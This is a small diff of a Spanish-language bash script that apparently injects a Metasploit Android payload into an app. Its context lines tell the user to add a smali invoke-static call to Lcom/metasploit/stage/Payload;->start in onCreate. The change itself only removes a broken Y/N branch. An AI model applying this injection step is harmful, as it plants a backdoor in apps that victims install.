@@ -77,10 +77,6 @@ echo -e "$negro[presiona control + w y busca onCreate y pones esta linea en el m
 echo -e "$negro invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V      "
 echo -e -n $negro"Y/N="
 read ju4n 
-if [ $ju4n -eq Y ]; then
-
-elif [$ju4n -eq N ]; then
-       exit
 nano $point
 clear
 banner
